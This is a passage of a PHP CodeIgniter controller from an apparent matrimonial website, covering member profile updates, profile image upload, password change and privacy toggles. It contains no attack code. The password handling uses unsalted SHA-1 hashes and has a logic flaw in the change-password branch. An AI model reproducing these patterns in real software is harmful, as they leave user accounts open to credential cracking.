                $data['physical_attributes'] = json_encode($physical_attributes);
                // ------------------------------------ Physical Attributes------------------------------------ //

                // ------------------------------------ Language------------------------------------ //
                $language[] = array('mother_tongue'         =>  $this->input->post('mother_tongue'),
                                    'language'              =>  $this->input->post('language'),
                                    'speak'                 =>  $this->input->post('speak'),
                                    'read'                  =>  $this->input->post('read')
                                    );
                $data['language'] = json_encode($language);
                // ------------------------------------ Language------------------------------------ //

                // ------------------------------------Hobbies & Interest------------------------------------ //
                $hobbies_and_interest[] = array('hobby'     =>  $this->input->post('hobby'),
                                    'interest'              =>  $this->input->post('interest'),
                                    'music'                 =>  $this->input->post('music'),
                                    'books'                 =>  $this->input->post('books'),
                                    'movie'                 =>  $this->input->post('movie'),
                                    'tv_show'               =>  $this->input->post('tv_show'),
                                    'sports_show'           =>  $this->input->post('sports_show'),
                                    'fitness_activity'      =>  $this->input->post('fitness_activity'),
                                    'cuisine'               =>  $this->input->post('cuisine'),
                                    'dress_style'           =>  $this->input->post('dress_style')
                                    );
                $data['hobbies_and_interest'] = json_encode($hobbies_and_interest);
                // ------------------------------------Hobbies & Interest------------------------------------ //

                // ------------------------------------ Personal Attitude & Behavior------------------------------------ //
                $personal_attitude_and_behavior[] = array('affection'   =>  $this->input->post('affection'),
                                                    'humor'             =>  $this->input->post('humor'),
                                                    'political_view'    =>  $this->input->post('political_view'),
                                                    'religious_service' =>  $this->input->post('religious_service')
                                                    );
                $data['personal_attitude_and_behavior'] = json_encode($personal_attitude_and_behavior);
                // ------------------------------------ Personal Attitude & Behavior------------------------------------ //

                // ------------------------------------Residency Information------------------------------------ //
                $residency_information[] = array('birth_country'    =>  $this->input->post('birth_country'),
                                    'residency_country'     =>  $this->input->post('residency_country'),
                                    'citizenship_country'   =>  $this->input->post('citizenship_country'),
                                    'grow_up_country'       =>  $this->input->post('grow_up_country'),
                                    'immigration_status'    =>  $this->input->post('immigration_status')
                                    );
                $data['residency_information'] = json_encode($residency_information);
                // ------------------------------------Residency Information------------------------------------ //

                // ------------------------------------Spiritual and Social Background------------------------------------ //
                $spiritual_and_social_background[] = array('religion'   =>  $this->input->post('religion'),
                                    'caste'                 =>  $this->input->post('caste'),
                                    'sub_caste'             =>  $this->input->post('sub_caste'),
                                    'ethnicity'             =>  $this->input->post('ethnicity'),
                                    'personal_value'        =>  $this->input->post('personal_value'),
                                    'family_value'          =>  $this->input->post('family_value'),
                                    'u_manglik'             =>  $this->input->post('u_manglik'),
                                    'community_value'       =>  $this->input->post('community_value'),
                                    'family_status'         =>  $this->input->post('family_status')
                                    );
                $data['spiritual_and_social_background'] = json_encode($spiritual_and_social_background);
                // ------------------------------------Spiritual and Social Background------------------------------------ //

                // ------------------------------------ Life Style------------------------------------ //
                $life_style[] = array('diet'                =>  $this->input->post('diet'),
                                    'drink'                 =>  $this->input->post('drink'),
                                    'smoke'                 =>  $this->input->post('smoke'),
                                    'living_with'           =>  $this->input->post('living_with')
                                    );
                $data['life_style'] = json_encode($life_style);
                // ------------------------------------ Life Style------------------------------------ //

                // ------------------------------------ Astronomic Information------------------------------------ //
                $astronomic_information[] = array('sun_sign'    =>  $this->input->post('sun_sign'),
                                    'moon_sign'                 =>  $this->input->post('moon_sign'),
                                    'time_of_birth'             =>  $this->input->post('time_of_birth'),
                                    'city_of_birth'             =>  $this->input->post('city_of_birth')
                                    );
                $data['astronomic_information'] = json_encode($astronomic_information);
                // ------------------------------------ Astronomic Information------------------------------------ //

                // ------------------------------------Permanent Address------------------------------------ //
                $permanent_address[] = array('permanent_country'    =>  $this->input->post('permanent_country'),
                                    'permanent_city'                =>  $this->input->post('permanent_city'),
                                    'permanent_state'               =>  $this->input->post('permanent_state'),
                                    'permanent_postal_code'         =>  $this->input->post('permanent_postal_code')
                                    );
                $data['permanent_address'] = json_encode($permanent_address);
                // ------------------------------------Permanent Address------------------------------------ //

                // ------------------------------------Family Information------------------------------------ //
                $family_info[] = array('father'             =>  $this->input->post('father'),
                                    'mother'                =>  $this->input->post('mother'),
                                    'brother_sister'        =>  $this->input->post('brother_sister')
                                    );
                $data['family_info'] = json_encode($family_info);
                // ------------------------------------Family Information------------------------------------ //

                // ------------------------------------ Additional Personal Details------------------------------------ //
                $additional_personal_details[] = array('home_district'  =>  $this->input->post('home_district'),
                                    'family_residence'              =>  $this->input->post('family_residence'),
                                    'fathers_occupation'            =>  $this->input->post('fathers_occupation'),
                                    'special_circumstances'         =>  $this->input->post('special_circumstances')
                                    );
                $data['additional_personal_details'] = json_encode($additional_personal_details);
                // ------------------------------------ Additional Personal Details------------------------------------ //

                // ------------------------------------ Partner Expectation------------------------------------ //
                $partner_expectation[] = array('general_requirement'    =>  $this->input->post('general_requirement'),
                                    'partner_age'                       =>  $this->input->post('partner_age'),
                                    'partner_height'                    =>  $this->input->post('partner_height'),
                                    'partner_weight'                    =>  $this->input->post('partner_weight'),
                                    'partner_marital_status'            =>  $this->input->post('partner_marital_status'),
                                    'with_children_acceptables'         =>  $this->input->post('with_children_acceptables'),
                                    'partner_country_of_residence'      =>  $this->input->post('partner_country_of_residence'),
                                    'partner_religion'                  =>  $this->input->post('partner_religion'),
                                    'partner_caste'                     =>  $this->input->post('partner_caste'),
                                    'partner_complexion'                =>  $this->input->post('partner_complexion'),
                                    'partner_education'                 =>  $this->input->post('partner_education'),
                                    'partner_profession'                =>  $this->input->post('partner_profession'),
                                    'partner_drinking_habits'           =>  $this->input->post('partner_drinking_habits'),
                                    'partner_smoking_habits'            =>  $this->input->post('partner_smoking_habits'),
                                    'partner_diet'                      =>  $this->input->post('partner_diet'),
                                    'partner_body_type'                 =>  $this->input->post('partner_body_type'),
                                    'partner_personal_value'            =>  $this->input->post('partner_personal_value'),
                                    'manglik'                           =>  $this->input->post('manglik'),
                                    'partner_any_disability'            =>  $this->input->post('partner_any_disability'),
                                    'partner_mother_tongue'             =>  $this->input->post('partner_mother_tongue'),
                                    'partner_family_value'              =>  $this->input->post('partner_family_value'),
                                    'prefered_country'                  =>  $this->input->post('prefered_country'),
                                    'prefered_state'                    =>  $this->input->post('prefered_state'),
                                    'prefered_status'                   =>  $this->input->post('prefered_status')
                                    );
                $data['partner_expectation'] = json_encode($partner_expectation);
                // ------------------------------------ Partner Expectation------------------------------------ //

                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();
                if ($result) {
                    $this->session->set_flashdata('alert', 'edit');
                    redirect(base_url().'home/profile', 'refresh');
                }
            }
        }
        elseif ($para1=="update_introduction") {
            $this->form_validation->set_rules('introduction', 'Introduction', 'required');

            if ($this->form_validation->run() == FALSE) {
                $ajax_error[] = array('ajax_error'  =>  validation_errors());
                echo json_encode($ajax_error);
            }
            else {
                $data['introduction'] = $this->input->post('introduction');
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();
                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $this->load->view('front/profile/dashboard/introduction', $page_data);
            }
        }
        elseif ($para1=="update_basic_info") {
            $this->form_validation->set_rules('first_name', 'First Name', 'required');
            $this->form_validation->set_rules('last_name', 'Last Name', 'required');
            $this->form_validation->set_rules('gender', 'Gender', 'required');
            $this->form_validation->set_rules('on_behalf', 'On Behalf', 'required');
            $this->form_validation->set_rules('date_of_birth', 'Date of Birth', 'required');

            if ($this->input->post('old_email') != $this->input->post('email')) {
                $this->form_validation->set_rules('email', 'Email', 'required|is_unique[member.email]',array('required' => 'The %s is required.', 'is_unique' => 'This %s already exists.'));
            }
            if ($this->input->post('old_mobile') != $this->input->post('mobile')) {
                $this->form_validation->set_rules('mobile', 'Mobile', 'required|is_unique[member.mobile]',array('required' => 'The %s is required.', 'is_unique' => 'This %s already exists.'));
            }
            $this->form_validation->set_rules('marital_status', 'Marital Status', 'required');

            if ($this->form_validation->run() == FALSE) {
                $ajax_error[] = array('ajax_error'  =>  validation_errors());
                echo json_encode($ajax_error);
            }
            else {
                $data['first_name'] = $this->input->post('first_name');
                $data['last_name'] = $this->input->post('last_name');
                $data['gender'] = $this->input->post('gender');
                if(!demo()){
                    $data['email'] = $this->input->post('email');
                }
                $data['mobile'] = $this->input->post('mobile');
                $data['secondary_mobile'] = $this->input->post('secondary_mobile');
                $data['date_of_birth'] = strtotime($this->input->post('date_of_birth'));

                // ------------------------------------Basic Info------------------------------------ //
                $basic_info[] = array(
                                    'marital_status'        =>  $this->input->post('marital_status'),
                                    'number_of_children'    =>  $this->input->post('number_of_children'),
                                    'area'                  =>  $this->input->post('area'),
                                    'on_behalf'                  =>  $this->input->post('on_behalf')

                                    );
                $data['basic_info'] = json_encode($basic_info);
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $this->load->view('front/profile/dashboard/basic_info', $page_data);
            }
        }
        elseif ($para1=="update_present_address") {
            //$this->form_validation->set_rules('country', 'Country', 'required');
            //$this->form_validation->set_rules('state', 'State', 'required');
            // $this->form_validation->set_rules('city', 'City', 'required');

            //if ($this->form_validation->run() == FALSE) {
            //    $ajax_error[] = array('ajax_error'  =>  validation_errors());
            //    echo json_encode($ajax_error);
            //}

            //else {
                // ------------------------------------Present Address------------------------------------ //
                $present_address[] = array('country'        =>  $this->input->post('country'),
                                    'city'                  =>  $this->input->post('city'),
                                    'state'                 =>  $this->input->post('state'),
                                    'postal_code'           =>  $this->input->post('postal_code')
                                    );
                $data['present_address'] = json_encode($present_address);
                $data['city'] = $this->input->post('city');

                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/present_address', $page_data);
            //}
        }
        elseif ($para1=="update_education_and_career") {
            //$this->form_validation->set_rules('highest_education', 'Highest Education', 'required');
            //$this->form_validation->set_rules('occupation', 'Occupation', 'required');

            //if ($this->form_validation->run() == FALSE) {
            //    $ajax_error[] = array('ajax_error'  =>  validation_errors());
            //    echo json_encode($ajax_error);
           // }

           // else {
                // ------------------------------------Education & Career------------------------------------ //
                $education_and_career[] = array('highest_education' =>  $this->input->post('degree'),
                                    'occupation'                    =>  $this->input->post('occupation'),
                                    'annual_income'                 =>  $this->input->post('anual_income')
                                    );
                $data['education_and_career'] = json_encode($education_and_career);
                $data['degree'] = $this->input->post('degree');
                $data['occupation'] = $this->input->post('occupation');
                $data['anual_income'] = $this->input->post('anual_income');

                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/education_and_career', $page_data);
            //}
        }
        elseif ($para1=="update_physical_attributes") {
            // ------------------------------------ Physical Attributes------------------------------------ //
            $physical_attributes[] = array('weight'     =>  $this->input->post('weight'),
                                'eye_color'             =>  $this->input->post('eye_color'),
                                'hair_color'            =>  $this->input->post('hair_color'),
                                'complexion'            =>  $this->input->post('complexion'),
                                'blood_group'           =>  $this->input->post('blood_group'),
                                'body_type'             =>  $this->input->post('body_type'),
                                'body_art'              =>  $this->input->post('body_art'),
                                'any_disability'        =>  $this->input->post('any_disability')
                                );
            $data['height'] = $this->input->post('height');
            $data['p_height'] = $this->input->post('p_height');
            $data['physical_attributes'] = json_encode($physical_attributes);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/physical_attributes', $page_data);
        }
        elseif ($para1=="update_language") {
            //$this->form_validation->set_rules('mother_tongue', 'Mother Tongue', 'required');

            //if ($this->form_validation->run() == FALSE) {
             //   $ajax_error[] = array('ajax_error'  =>  validation_errors());
            //    echo json_encode($ajax_error);
           // }

           // else {
                // ------------------------------------ Language------------------------------------ //
                $language[] = array('mother_tongue'         =>  $this->input->post('mother_tongue'),
                                    'language'              =>  $this->input->post('language'),
                                    'speak'                 =>  $this->input->post('speak'),
                                    'read'                  =>  $this->input->post('read')
                                    );
                $data['language'] = json_encode($language);
                $data['mother_tounge'] = $this->input->post('mother_tounge');
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/language', $page_data);
            //}
        }
        elseif ($para1=="update_hobbies_and_interest") {
            // ------------------------------------Hobbies & Interest------------------------------------ //
            $hobbies_and_interest[] = array('hobby'     =>  $this->input->post('hobby'),
                                'interest'              =>  $this->input->post('interest'),
                                'music'                 =>  $this->input->post('music'),
                                'books'                 =>  $this->input->post('books'),
                                'movie'                 =>  $this->input->post('movie'),
                                'tv_show'               =>  $this->input->post('tv_show'),
                                'sports_show'           =>  $this->input->post('sports_show'),
                                'fitness_activity'      =>  $this->input->post('fitness_activity'),
                                'cuisine'               =>  $this->input->post('cuisine'),
                                'dress_style'           =>  $this->input->post('dress_style')
                                );
            $data['hobbies_and_interest'] = json_encode($hobbies_and_interest);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/hobbies_and_interest', $page_data);
        }
        elseif ($para1=="update_personal_attitude_and_behavior") {
            // ------------------------------------ Personal Attitude & Behavior------------------------------------ //
            $personal_attitude_and_behavior[] = array('affection'   =>  $this->input->post('affection'),
                                                'humor'             =>  $this->input->post('humor'),
                                                'political_view'    =>  $this->input->post('political_view'),
                                                'religious_service' =>  $this->input->post('religious_service')
                                                );
            $data['personal_attitude_and_behavior'] = json_encode($personal_attitude_and_behavior);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/personal_attitude_and_behavior', $page_data);
        }
        elseif ($para1=="update_residency_information") {
            $this->form_validation->set_rules('birth_country', 'Birth Country', 'required');
            $this->form_validation->set_rules('citizenship_country', 'Citizenship Country', 'required');

            if ($this->form_validation->run() == FALSE) {
                $ajax_error[] = array('ajax_error'  =>  validation_errors());
                echo json_encode($ajax_error);
            }

            else {
                // ------------------------------------Residency Information------------------------------------ //
                $residency_information[] = array('birth_country'    =>  $this->input->post('birth_country'),
                                    'residency_country'     =>  $this->input->post('residency_country'),
                                    'citizenship_country'   =>  $this->input->post('citizenship_country'),
                                    'grow_up_country'       =>  $this->input->post('grow_up_country'),
                                    'immigration_status'    =>  $this->input->post('immigration_status')
                                    );
                $data['residency_information'] = json_encode($residency_information);
                // ------------------------------------Residency Information------------------------------------ //
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/residency_information', $page_data);
            }
        }
        elseif ($para1=="update_spiritual_and_social_background") {
            //$this->form_validation->set_rules('religion', 'Religion', 'required');

           // if ($this->form_validation->run() == FALSE) {
            //    $ajax_error[] = array('ajax_error'  =>  validation_errors());
            //    echo json_encode($ajax_error);
           // }

            //else {
                // ------------------------------------Spiritual and Social Background------------------------------------ //
                $spiritual_and_social_background[] = array('religion'   =>  $this->input->post('religion'),
                                    'caste'                 =>  $this->input->post('caste'),
                                    'sub_caste'             =>  $this->input->post('sub_caste'),
                                    'ethnicity'             =>  $this->input->post('ethnicity'),
                                    'personal_value'        =>  $this->input->post('personal_value'),
                                    'family_value'          =>  $this->input->post('family_value'),
                                    'u_manglik'             =>  $this->input->post('u_manglik'),
                                    'community_value'       =>  $this->input->post('community_value'),
                                    'family_status'          =>  $this->input->post('family_status')
                                    );
                $data['spiritual_and_social_background'] = json_encode($spiritual_and_social_background);
                $data['religion'] = $this->input->post('religion');
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/spiritual_and_social_background', $page_data);
            //}
        }
        elseif ($para1=="update_life_style") {
            // ------------------------------------ Life Style------------------------------------ //
            $life_style[] = array('diet'                =>  $this->input->post('diet'),
                                'drink'                 =>  $this->input->post('drink'),
                                'smoke'                 =>  $this->input->post('smoke'),
                                'living_with'           =>  $this->input->post('living_with')
                                );
            $data['life_style'] = json_encode($life_style);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/life_style', $page_data);
        }
        elseif ($para1=="update_astronomic_information") {

            // ------------------------------------ Astronomic Information------------------------------------ //
            $astronomic_information[] = array('sun_sign'    =>  $this->input->post('sun_sign'),
                                'moon_sign'                 =>  $this->input->post('moon_sign'),
                                'time_of_birth'             =>  $this->input->post('time_of_birth'),
                                'city_of_birth'             =>  $this->input->post('city_of_birth')
                                );

            $data['astronomic_information'] = json_encode($astronomic_information);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/astronomic_information', $page_data);

        }
        elseif ($para1=="update_permanent_address") {
            $this->form_validation->set_rules('permanent_country', 'Permanent Country', 'required');
            $this->form_validation->set_rules('permanent_state', 'Permanent State', 'required');
            // $this->form_validation->set_rules('permanent_city', 'Permanent City', 'required');

            if ($this->form_validation->run() == FALSE) {
                $ajax_error[] = array('ajax_error'  =>  validation_errors());
                echo json_encode($ajax_error);
            }

            else {
                // ------------------------------------Permanent Address------------------------------------ //
                $permanent_address[] = array('permanent_country'    =>  $this->input->post('permanent_country'),
                                    'permanent_city'                =>  $this->input->post('permanent_city'),
                                    'permanent_state'               =>  $this->input->post('permanent_state'),
                                    'permanent_postal_code'         =>  $this->input->post('permanent_postal_code')
                                    );
                $data['permanent_address'] = json_encode($permanent_address);
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
                recache();

                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
                $this->load->view('front/profile/dashboard/permanent_address', $page_data);
            }
        }
        elseif ($para1=="update_family_info") {
            // ------------------------------------Family Information------------------------------------ //
            $family_info[] = array('father'             =>  $this->input->post('father'),
                                'mother'                =>  $this->input->post('mother'),
                                'brother_sister'        =>  $this->input->post('brother_sister')
                                );
            $data['family_info'] = json_encode($family_info);

            $data['brothers'] = $this->input->post('brothers');
            $data['sisters'] = $this->input->post('sisters');
            $data['father_ocuupation'] = $this->input->post('father_ocuupation');
            $data['mother_occupation'] = $this->input->post('mother_occupation');

            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
                $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/family_info', $page_data);
        }
        elseif ($para1=="update_additional_personal_details") {
            // ------------------------------------ Additional Personal Details------------------------------------ //
            $additional_personal_details[] = array('home_district'  =>  $this->input->post('home_district'),
                                'family_residence'              =>  $this->input->post('family_residence'),
                                'fathers_occupation'            =>  $this->input->post('fathers_occupation'),
                                'special_circumstances'         =>  $this->input->post('special_circumstances')
                                );
            $data['additional_personal_details'] = json_encode($additional_personal_details);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/additional_personal_details', $page_data);
        }
        elseif ($para1=="update_partner_expectation") {
            // ------------------------------------ Partner Expectation------------------------------------ //
            $partner_expectation[] = array('general_requirement'    =>  $this->input->post('general_requirement'),
                                'partner_age'                       =>  $this->input->post('partner_age'),
                                'partner_height'                    =>  $this->input->post('partner_height'),
                                'partner_weight'                    =>  $this->input->post('partner_weight'),
                                'partner_marital_status'            =>  $this->input->post('partner_marital_status'),
                                'with_children_acceptables'         =>  $this->input->post('with_children_acceptables'),
                                'partner_country_of_residence'      =>  $this->input->post('partner_country_of_residence'),
                                'partner_religion'                  =>  $this->input->post('partner_religion'),
                                'partner_caste'                     =>  $this->input->post('partner_caste'),
                                'partner_sub_caste'                 =>  $this->input->post('partner_sub_caste'),
                                'partner_complexion'                =>  $this->input->post('partner_complexion'),
                                'partner_education'                 =>  $this->input->post('partner_education'),
                                'partner_profession'                =>  $this->input->post('partner_profession'),
                                'partner_drinking_habits'           =>  $this->input->post('partner_drinking_habits'),
                                'partner_smoking_habits'            =>  $this->input->post('partner_smoking_habits'),
                                'partner_diet'                      =>  $this->input->post('partner_diet'),
                                'partner_body_type'                 =>  $this->input->post('partner_body_type'),
                                'partner_personal_value'            =>  $this->input->post('partner_personal_value'),
                                'manglik'                           =>  $this->input->post('manglik'),
                                'partner_any_disability'            =>  $this->input->post('partner_any_disability'),
                                'partner_mother_tongue'             =>  $this->input->post('partner_mother_tongue'),
                                'partner_family_value'              =>  $this->input->post('partner_family_value'),
                                'prefered_country'                  =>  $this->input->post('prefered_country'),
                                'prefered_state'                    =>  $this->input->post('prefered_state'),
                                'prefered_status'                   =>  $this->input->post('prefered_status')
                                );
            $data['partner_expectation'] = json_encode($partner_expectation);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $page_data['privacy_status_data'] = json_decode($privacy_status, true);
            $this->load->view('front/profile/dashboard/partner_expectation', $page_data);
        }
        elseif ($para1=="update_image") {
            if(!demo()){
                $id = $this->session->userdata('member_id');
                $img = $_POST['profile_image_value'];
                $img = str_replace('data:image/jpeg;base64,', '', $img);
                $img = str_replace(' ', '+', $img);
                $data = base64_decode($img);
                $file = 'uploads/' . 'profile' . '_image/profile' .'_' . $id . '.jpg';
                //var_dump($data);
                $success = file_put_contents($file, $data);

                $images[] = array('profile_image' => 'profile_' . $id . '.jpg', 'thumb' => 'profile_' . $id . '.jpg');
                
                

                $dt['profile_image'] = json_encode($images);
                $dt['profile_image_status'] = 0;
                $dt['profile_image_update_time'] = date("Y-m-d H:i:s") ;
                
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $dt);
                recache();

                $this->session->set_flashdata('alert', 'edit_image');
                redirect(base_url().'home/profile', 'refresh');

                    

                // if ($_FILES['profile_image']['name'] !== '') {
                //     $id = $this->session->userdata('member_id');
                //     $path = $_FILES['profile_image']['name'];
                //     $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                //     if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG") {
                //         $this->Crud_model->file_up("profile_image", "profile", $id, '', '', $ext);
                //         $images[] = array('profile_image' => 'profile_' . $id . $ext, 'thumb' => 'profile_' . $id . '_thumb' . $ext);
                //         $data['profile_image'] = json_encode($images);
                //         $data['profile_image_status'] = 0;
                //         $data['profile_image_update_time'] = date("Y-m-d H:i:s") ;

                //         $this->db->where('member_id', $this->session->userdata('member_id'));
                //         $result = $this->db->update('member', $data);
                //         recache();

                //         $this->session->set_flashdata('alert', 'edit_image');
                //         redirect(base_url().'home/profile', 'refresh');
                //     }
                //     else {
                //         $this->session->set_flashdata('alert', 'failed');
                //         redirect(base_url().'home/profile', 'refresh');
                //     }
                // }
            }else {
                $this->session->set_flashdata('alert', 'edit_image');
                redirect(base_url().'home/profile', 'refresh');
            }

        }
        elseif ($para1=="update_password") {
            if(!demo()){
                $user_id = $this->session->userdata('member_id');
                $current_password = sha1($this->input->post('current_password'));
                $new_password = sha1($this->input->post('new_password'));
                $confirm_password = sha1($this->input->post('confirm_password'));
                $prev_password = $this->db->get_where('member', array('member_id' => $user_id))->row()->password;
                if ($prev_password == $current_password) {
                    if ($new_password == $current_password) {
                        $ajax_error[] = array('ajax_error'  =>  "<p>".translate('new_password_and_current_password_are_same')."!</p>");
                        echo json_encode($ajax_error);
                    }
                    if ($new_password == $confirm_password) {
                        $this->db->where('member_id', $user_id);
                        $this->db->update('member', array('password' => $new_password));
                        recache();
                    } else {
                        $ajax_error[] = array('ajax_error'  =>  "<p>".translate('new_password_does_not_matched_with_confirm_password')."!</p>");
                        echo json_encode($ajax_error);
                    }
                } else {
                    $ajax_error[] = array('ajax_error'  =>  "<p>".translate('invalid_current_password')."!</p>");
                    echo json_encode($ajax_error);
                }
            }
        }
        elseif ($para1=="unhide_section") {
            // ------------------------------------ Unhide Section------------------------------------ //
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $privacy_status_data = json_decode($privacy_status, true);
            foreach ($privacy_status_data as $key => $value) {
                if ($key == $para2) {
                    $privacy_status_data[0][$para2] = 'yes';
                }
            }
            $data['privacy_status'] = json_encode($privacy_status_data);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $this->load->view('front/profile/dashboard/additional_personal_details', $page_data);
        }
        elseif ($para1=="hide_section") {
            // ------------------------------------ Unhide Section------------------------------------ //
            $privacy_status = $this->Crud_model->get_type_name_by_id('member', $this->session->userdata['member_id'], 'privacy_status');
            $privacy_status_data = json_decode($privacy_status, true);
            foreach ($privacy_status_data as $key => $value) {
                if ($key == $para2) {
                    $privacy_status_data[0][$para2] = 'no';
                }
            }
            $data['privacy_status'] = json_encode($privacy_status_data);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
            recache();

            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $this->load->view('front/profile/dashboard/additional_personal_details', $page_data);
        }
        elseif ($para1=="update_pic_privacy") {

            $pic_privacy[] = array(
                                'profile_pic_show'     =>  $this->input->post('profile_pic_show'),
                                'gallery_show'             =>  $this->input->post('gallery_show')
                                );
            $data['pic_privacy'] = json_encode($pic_privacy, true);
            $this->db->where('member_id', $this->session->userdata('member_id'));
            $result = $this->db->update('member', $data);
             recache();

        }
    }

    function plans($para1="",$para2="")
    {
        if ($para1=="") {
            $page_data['title']         = "Premium Plans || ".$this->system_title;
            $page_data['top']           = "plans.php";
            $page_data['page']          = "plans";
            $page_data['bottom']        = "plans.php";
            $page_data['page_url']      = "home/plans";
            $page_data['all_plans']     = $this->db->get("plan")->result();
            if ($this->session->flashdata('alert') == "paypal_cancel") {
                $page_data['danger_alert'] = translate("you_have_canceled_your_payment_via_paypal!");
            }
            elseif ($this->session->flashdata('alert') == "pum_fail") {
                $page_data['danger_alert'] = translate("your_payment_via_payUMoney_has_been_failed!");
            }
            elseif ($this->session->flashdata('alert') == "stripe_failed") {
                $page_data['danger_alert'] = translate("your_payment_via_stripe_has_been_failed!");
            }
            $this->load->view('front/index', $page_data);
        }
